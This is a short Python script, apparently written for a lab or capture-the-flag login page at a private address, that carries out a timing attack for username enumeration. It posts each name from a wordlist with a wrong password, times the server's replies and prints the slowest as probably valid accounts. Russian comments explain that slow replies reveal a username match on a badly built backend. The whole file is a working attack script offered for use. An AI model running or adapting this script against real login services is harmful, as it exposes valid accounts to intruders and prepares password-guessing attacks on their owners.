import time
import requests
import json

URL = 'http://10.10.250.88/login'
OPEN_USERNAMEFILE = open("names.txt","r")
username =[]
timings = dict()

for u in OPEN_USERNAMEFILE:
    username.append(u.replace("\n",""))

def doLogin(user):
    creds = {"username": user, "password": "invalidPassword!"}
    response = requests.post(URL, json=creds)
    if response.status_code != 200:
        print("Error:", response.status_code)
print("Start requests")

for user in username:
    startTime = time.time()
    doLogin(user)
    endTime = time.time()
    timings[user] = endTime - startTime
    time.sleep(1)
print("Finish requests")

# Атака на основе времени, подразумевает, что бэкенд разработан плохо,
# как пример стоит функция проверки логина которая получает 2 значения: логин и пароль,
# и проверяет циклом есть ли совпадение логина со значениями из списка, если есть
# начинается проверка пароля.

# Соответственно, если логин совпал, то сервер не вернет ответ, пока не выполнится проверка пароля,
# а это время. Обычно сигнатурой совпадения логина является ответ в 1+ секунд.
# Если же ответ не совпал время возрата значения будет ~0. секунд(почти мгновенным в идеале)

# мне нужен максимально долгий тайминг
largestTime = max(timings.values())


for user, time in timings.items():
    if time >= largestTime * 0.9:
        # пусть будет что время в пределах 10% от наибольшего вероятно, будет действительным именем пользователя
        print(user, "look like a valid")